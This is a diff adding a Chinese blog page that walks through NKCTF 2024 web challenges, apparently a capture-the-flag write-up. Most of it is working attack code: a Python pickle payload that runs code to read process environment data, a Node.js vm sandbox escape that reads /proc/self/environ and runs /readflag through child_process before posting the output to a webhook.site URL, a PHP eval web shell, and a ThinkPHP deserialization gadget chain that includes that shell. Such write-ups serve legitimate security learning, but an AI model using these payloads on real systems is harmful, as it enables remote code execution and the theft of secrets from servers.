@@ -1,0 +1,566 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"chensonghi.github.io.","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","Sidebar Display (only for Muse | Mist), available values":["always  expand for all pages automatically."],"display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="attack_tacooooo账号&amp;#116;&amp;#x61;&amp;#99;&amp;#111;&amp;#111;&amp;#x6f;&amp;#x6f;&amp;#111;&amp;#x40;&amp;#x71;&amp;#x71;&amp;#46;&amp;#99;&amp;#x6f;&amp;#109; 密码tacooooo 12345678910111213141516171819202122232425262728293031import pickleclass Exploit(obje">
+<meta property="og:type" content="article">
+<meta property="og:title" content="NKCTF-2024wp">
+<meta property="og:url" content="https://chensonghi.github.io./2024/03/25/NKCTF/index.html">
+<meta property="og:site_name" content="星河风">
+<meta property="og:description" content="attack_tacooooo账号&amp;#116;&amp;#x61;&amp;#99;&amp;#111;&amp;#111;&amp;#x6f;&amp;#x6f;&amp;#111;&amp;#x40;&amp;#x71;&amp;#x71;&amp;#46;&amp;#99;&amp;#x6f;&amp;#109; 密码tacooooo 12345678910111213141516171819202122232425262728293031import pickleclass Exploit(obje">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://chensonghi.github.io./1.png">
+<meta property="og:image" content="https://chensonghi.github.io./png">
+<meta property="og:image" content="https://chensonghi.github.io./image-20240325015219515.png">
+<meta property="og:image" content="https://chensonghi.github.io./image-20240325015408536-1711303060130-3.png">
+<meta property="og:image" content="https://chensonghi.github.io./image-20240325003234029.png">
+<meta property="og:image" content="https://chensonghi.github.io./image-20240325002928083.png">
+<meta property="og:image" content="https://chensonghi.github.io./image-20240325003008039.png">
+<meta property="og:image" content="https://chensonghi.github.io./image-20240325003110936.png">
+<meta property="og:image" content="https://chensonghi.github.io./image-20240325003448934.png">
+<meta property="og:image" content="https://chensonghi.github.io./image-20240325003740680.png">
+<meta property="og:image" content="https://chensonghi.github.io./image-20240325003816026.png">
+<meta property="og:image" content="https://chensonghi.github.io./image-20240325003913601.png">
+<meta property="og:image" content="https://chensonghi.github.io./image-20240325015550464.png">
+<meta property="article:published_time" content="2024-03-24T16:48:41.000Z">
+<meta property="article:modified_time" content="2024-03-24T18:02:22.400Z">
+<meta property="article:author" content="chleynx">
+<meta property="article:tag" content="2024">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://chensonghi.github.io./1.png">
+
+<link rel="canonical" href="https://chensonghi.github.io./2024/03/25/NKCTF/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>NKCTF-2024wp | 星河风</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">星河风</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-schedule">
+
+    <a href="/schedule/" rel="section"><i class="fa fa-calendar fa-fw"></i>日程表</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://chensonghi.github.io./2024/03/25/NKCTF/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/ch.jpg">
+      <meta itemprop="name" content="chleynx">
+      <meta itemprop="description" content="不是看到希望才坚持，而是坚持了才能看到希望">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="星河风">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          NKCTF-2024wp
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2024-03-25 00:48:41 / 修改时间：02:02:22" itemprop="dateCreated datePublished" datetime="2024-03-25T00:48:41+08:00">2024-03-25</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/challenge/" itemprop="url" rel="index"><span itemprop="name">challenge</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id=""><a href="#" class="headerlink" title=""></a></h2><h2 id="attack-tacooooo"><a href="#attack-tacooooo" class="headerlink" title="attack_tacooooo"></a><strong>attack_tacooooo</strong></h2><p>账号<a href="mailto:&#116;&#x61;&#99;&#111;&#111;&#x6f;&#x6f;&#111;&#x40;&#x71;&#x71;&#46;&#99;&#x6f;&#109;">&#116;&#x61;&#99;&#111;&#111;&#x6f;&#x6f;&#111;&#x40;&#x71;&#x71;&#46;&#99;&#x6f;&#109;</a></p>
+<p>密码tacooooo</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">import pickle</span><br><span class="line"></span><br><span class="line">class Exploit(object):</span><br><span class="line"></span><br><span class="line">    def __reduce__(self):</span><br><span class="line">        code = &quot;&quot;&quot;</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line">def find_flag_and_write(source_directory, destination_path, destination_file_name):</span><br><span class="line"></span><br><span class="line">    with open(&quot;/proc/1/environ&quot;, &#x27;r&#x27;) as flag_file:</span><br><span class="line">        flag_content = flag_file.read()</span><br><span class="line"></span><br><span class="line">    destination_file_path = os.path.join(destination_path, destination_file_name)</span><br><span class="line">    with open(destination_file_path, &#x27;a&#x27;) as destination_file:</span><br><span class="line">        destination_file.write(flag_content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">find_flag_and_write(&#x27;/&#x27;, &#x27;../var/lib/pgadmin/storage/tacooooo_qq.com/&#x27;, &#x27;flag.txt&#x27;)</span><br><span class="line"></span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">        # 使用纯 Python 代码来写入文件</span><br><span class="line">        return (exec, (code,))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 序列化 exploit 对象</span><br><span class="line">with open(&#x27;posix.pickle&#x27;, &#x27;wb&#x27;) as f:</span><br><span class="line">    pickle.dump(Exploit(), f)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="全世界最简单的CTF"><a href="#全世界最简单的CTF" class="headerlink" title="全世界最简单的CTF"></a><strong>全世界最简单的CTF</strong></h2><p>source</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">const express = require(&#x27;express&#x27;);</span><br><span class="line">const bodyParser = require(&#x27;body-parser&#x27;);</span><br><span class="line">const app = express();</span><br><span class="line">const fs = require(&quot;fs&quot;);</span><br><span class="line">const path = require(&#x27;path&#x27;);</span><br><span class="line">const vm = require(&quot;vm&quot;);</span><br><span class="line">app.use(bodyParser.json())</span><br><span class="line">	.set(&#x27;views&#x27;, path.join(__dirname, &#x27;views&#x27;))</span><br><span class="line">	.use(express.static(path.join(__dirname, &#x27;/public&#x27;))) app.get(&#x27;/&#x27;, function(req, res) &#123;</span><br><span class="line">		res.sendFile(__dirname + &#x27;/public/home.html&#x27;);</span><br><span class="line">	&#125;)</span><br><span class="line">function waf(code) &#123;</span><br><span class="line">	let pattern = /(process|\[.*?\]|exec|spawn|Buffer|\\|\+|concat|eval|Function)/g;</span><br><span class="line">	if (code.match(pattern)) &#123;</span><br><span class="line">		throw new Error(&quot;what can I say? hacker out!!&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">app.post(&#x27;/&#x27;, function(req, res) &#123;</span><br><span class="line">	let code = req.body.code;</span><br><span class="line">	let sandbox = Object.create(null);</span><br><span class="line">	let context = vm.createContext(sandbox);</span><br><span class="line">	try &#123;</span><br><span class="line">		waf(code) let result = vm.runInContext(code, context);</span><br><span class="line">		console.log(result);</span><br><span class="line">	&#125; catch (e) &#123;</span><br><span class="line">		console.log(e.message);</span><br><span class="line">		require(&#x27;./hack&#x27;);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;) app.get(&#x27;/secret&#x27;, function(req, res) &#123;</span><br><span class="line">	if (process.__filename == null) &#123;</span><br><span class="line">		let content = fs.readFileSync(__filename, &quot;utf-8&quot;);</span><br><span class="line">		return res.send(content);</span><br><span class="line">	&#125; else &#123;</span><br><span class="line">		let content = fs.readFileSync(process.__filename, &quot;utf-8&quot;);</span><br><span class="line">		return res.send(content);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;) app.listen(3000, () =&gt; &#123;</span><br><span class="line">	console.log(&quot;listen on 3000&quot;);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">payload:</span><br><span class="line">1、</span><br><span class="line">throw new Proxy(&#123;&#125;, &#123;</span><br><span class="line">    get: function() &#123;</span><br><span class="line">      const cc = arguments.callee.caller;</span><br><span class="line">      const g = (cc.constructor.constructor(`return $&#123;`$&#123;&#x27;proces&#x27;&#125;s`&#125;`))();</span><br><span class="line">      const h = g.mainModule.require(&#x27;fs&#x27;).readFileSync(&#x27;/proc/self/environ&#x27;);</span><br><span class="line">      const p = (cc.constructor.constructor(&#x27;return fetch&#x27;))();</span><br><span class="line">      return p(&quot;https://webhook.site/1dc4e877-3eb8-4642-a3ef-17fc03f43ffa&quot;, &#123;method: &quot;POST&quot;, body: JSON.stringify(&#123;data: `$&#123;h&#125;`&#125;)&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">  exec被ban然后执行不了命令，中括号我本地能过，但是环境上不行。fs模块读不到flag文件。</span><br><span class="line">  </span><br><span class="line">  2、</span><br><span class="line">  过滤了中括号</span><br><span class="line">  throw new Proxy(&#123;&#125;, &#123;</span><br><span class="line">    get: function() &#123;</span><br><span class="line">      const cc = arguments.callee.caller;</span><br><span class="line">      const gg = (cc.constructor.constructor(`return $&#123;`$&#123;&#x27;proces&#x27;&#125;s`&#125;`))();</span><br><span class="line">      const hh = gg.mainModule.require(`$&#123;&#x27;child_p&#x27;&#125;rocess`);</span><br><span class="line">      const ff = (cc.constructor.constructor(`s = 1+2`))();</span><br><span class="line">      const p = (cc.constructor.constructor(&#x27;return fetch&#x27;))();</span><br><span class="line">      return p(&quot;https://webhook.site/1dc4e877-3eb8-4642-a3ef-17fc03f43ffa&quot;, &#123;method: &quot;POST&quot;, body: JSON.stringify(&#123;data: `$&#123;s&#125;`&#125;)&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line">两个思路：</span><br><span class="line">再构造一个函数。-------------不知道为什么不行</span><br><span class="line">可以写入js文件，使用fork执行然后fetch出来。--------------ok！</span><br><span class="line"></span><br><span class="line">payload：</span><br><span class="line">// 文件写入suceess</span><br><span class="line">throw new Proxy(&#123;&#125;, &#123;</span><br><span class="line">    get: function() &#123;</span><br><span class="line">      const cc = arguments.callee.caller;</span><br><span class="line">      const gg = (cc.constructor.constructor(`return $&#123;`$&#123;&#x27;proces&#x27;&#125;s`&#125;`))();</span><br><span class="line">let content = `</span><br><span class="line">        let cs = require(&#x27;$&#123;`$&#123;&#x27;child_p&#x27;&#125;rocess&#x27;).exe`&#125;cSync(&#x27;/readflag&#x27;).toString();</span><br><span class="line">        $&#123;`$&#123;&#x27;proces&#x27;&#125;s`&#125;.on(&quot;message&quot;,function(msg)&#123;</span><br><span class="line">            fetch(&quot;https://webhook.site/1dc4e877-3eb8-4642-a3ef-17fc03f43ffa&quot;, &#123;method: &quot;POST&quot;, body: JSON.stringify(&#123;data: cs&#125;)&#125;);</span><br><span class="line">        &#125;)</span><br><span class="line">      `;</span><br><span class="line">      const fs = gg.mainModule.require(&#x27;fs&#x27;).appendFileSync(&quot;./readflag1.js&quot;,content);</span><br><span class="line">      const p = (cc.constructor.constructor(&#x27;return fetch&#x27;))();</span><br><span class="line">      return p(&quot;https://webhook.site/1dc4e877-3eb8-4642-a3ef-17fc03f43ffa&quot;, &#123;method: &quot;POST&quot;, body: JSON.stringify(&#123;data: `$&#123;fs&#125;`&#125;)&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">//通信成功</span><br><span class="line">throw new Proxy(&#123;&#125;, &#123;</span><br><span class="line">    get: function() &#123;</span><br><span class="line">      const cc = arguments.callee.caller;</span><br><span class="line">      const g = (cc.constructor.constructor(`return $&#123;`$&#123;&#x27;proces&#x27;&#125;s`&#125;`))();</span><br><span class="line">      const h = g.mainModule.require(`$&#123;&#x27;child_p&#x27;&#125;rocess`).fork(&#x27;./readflag1.js&#x27;);</span><br><span class="line">      h.send(&#x27;hello&#x27;);</span><br><span class="line">      const p = (cc.constructor.constructor(&#x27;return fetch&#x27;))();</span><br><span class="line">      return p(&quot;https://webhook.site/1dc4e877-3eb8-4642-a3ef-17fc03f43ffa&quot;, &#123;method: &quot;POST&quot;, body: JSON.stringify(&#123;data: `$&#123;h&#125;`&#125;)&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;data&quot;: &quot;NKCTF&#123;5e1d772e-8260-444d-ab4b-21c7b7603521&#125;\n&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="-1"><a href="#-1" class="headerlink" title=""></a><img src="/1.png" alt="img"></h3><h2 id="my-first-cms"><a href="#my-first-cms" class="headerlink" title="my first cms"></a><strong>my first cms</strong></h2><p>这是什么cms？直接安装最新版的应该没有问题了吧……</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/capture0x/CMSMadeSimple2">GitHub - capture0x&#x2F;CMSMadeSimple2: CMS Made Simple Version: 2.2.19 - SSTI</a></p>
+<p>admin Admin123</p>
+<p><img src="/png" alt="img"></p>
+<h2 id="用过就是熟悉"><a href="#用过就是熟悉" class="headerlink" title="用过就是熟悉"></a>用过就是熟悉</h2><p>在db.sql找到日志，guest的密码</p>
+<p><img src="/image-20240325015219515.png" alt="image-20240325015219515"></p>
+<p>登录成功</p>
+<p><img src="/image-20240325015408536-1711303060130-3.png" alt="image-20240325015408536"></p>
+<p>回收站有个一句话木马，里面提示了shell路径&#x2F;var&#x2F;www&#x2F;html&#x2F;data&#x2F;files&#x2F;shell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php eval($_POST[0]); ?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>然后继续代码审计</p>
+<p>这里明显的php反序列化，tp框架</p>
+<p><img src="/image-20240325003234029.png" alt="image-20240325003234029"></p>
+<p>看thinkphp框架代码</p>
+<p><img src="/image-20240325002928083.png" alt="image-20240325002928083"></p>
+<p>找反序列化链子</p>
+<p><img src="/image-20240325003008039.png" alt="image-20240325003008039"></p>
+<p>找到Windows.php有个removeFiles函数</p>
+<p><img src="/image-20240325003110936.png" alt="image-20240325003110936"></p>
+<p>继续</p>
+<p><img src="/image-20240325003448934.png" alt="image-20240325003448934"></p>
+<p>明显的字符拼接，找__toString</p>
+<p><img src="/image-20240325003740680.png" alt="image-20240325003740680"></p>
+<p>调用toArray</p>
+<p><img src="/image-20240325003816026.png" alt="image-20240325003816026"></p>
+<p>这里可以触发__get—–不可访问的属性读数据</p>
+<p><img src="/image-20240325003913601.png" alt="image-20240325003913601"></p>
+<p>只找到这一个,继续跟进，可以触发__call——不可访问的函数</p>
+<p><img src="/image-20240325015550464.png" alt="image-20240325015550464"></p>
+<p>这里有文件包含</p>
+<p>写exp：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">namespace think\process\pipes;</span><br><span class="line"></span><br><span class="line">use think\Process;</span><br><span class="line">// __destruct</span><br><span class="line">class Windows&#123;</span><br><span class="line">    public $files = [];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace think;</span><br><span class="line"></span><br><span class="line">use ArrayAccess;</span><br><span class="line">use ArrayIterator;</span><br><span class="line">use Countable;</span><br><span class="line">use IteratorAggregate;</span><br><span class="line">use JsonSerializable;</span><br><span class="line">// __toString</span><br><span class="line">class Collection&#123;</span><br><span class="line">    public $items = [];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace think;</span><br><span class="line">// __get</span><br><span class="line">class View&#123;</span><br><span class="line">    public $data = [];</span><br><span class="line">    public $engine;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace think;</span><br><span class="line">// __call</span><br><span class="line">class Config&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">use think\process\pipes\Windows;</span><br><span class="line">$a = new Windows();</span><br><span class="line">$a -&gt; files = array(new \think\Collection());</span><br><span class="line">$a -&gt; files[0] -&gt; items = new \think\View();</span><br><span class="line">$a -&gt; files[0] -&gt; items -&gt; data[&#x27;loginout&#x27;=&gt;new \think\Config()];</span><br><span class="line">$a -&gt; files[0] -&gt; items -&gt; engine  = array(&#x27;name&#x27; =&gt; &#x27;../../../../../var/www/html/data/files/shell&#x27;);//绝对路径不行</span><br><span class="line"></span><br><span class="line">echo urlencode(base64_encode(serialize($a)));</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>然后post发包，</p>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>chleynx
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://chensonghi.github.io./2024/03/25/NKCTF/" title="NKCTF-2024wp">https://chensonghi.github.io./2024/03/25/NKCTF/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/2024/" rel="tag"># 2024</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2024/02/07/N1CTF-Junoir/" rel="prev" title="N1CTF Junoir">
+      <i class="fa fa-chevron-left"></i> N1CTF Junoir
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">1.</span> <span class="nav-text"></span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#attack-tacooooo"><span class="nav-number">2.</span> <span class="nav-text">attack_tacooooo</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%A8%E4%B8%96%E7%95%8C%E6%9C%80%E7%AE%80%E5%8D%95%E7%9A%84CTF"><span class="nav-number">3.</span> <span class="nav-text">全世界最简单的CTF</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#-1"><span class="nav-number">3.1.</span> <span class="nav-text"></span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#my-first-cms"><span class="nav-number">4.</span> <span class="nav-text">my first cms</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%94%A8%E8%BF%87%E5%B0%B1%E6%98%AF%E7%86%9F%E6%82%89"><span class="nav-number">5.</span> <span class="nav-text">用过就是熟悉</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="chleynx"
+      src="/images/ch.jpg">
+  <p class="site-author-name" itemprop="name">chleynx</p>
+  <div class="site-description" itemprop="description">不是看到希望才坚持，而是坚持了才能看到希望</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">15</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">3</span>
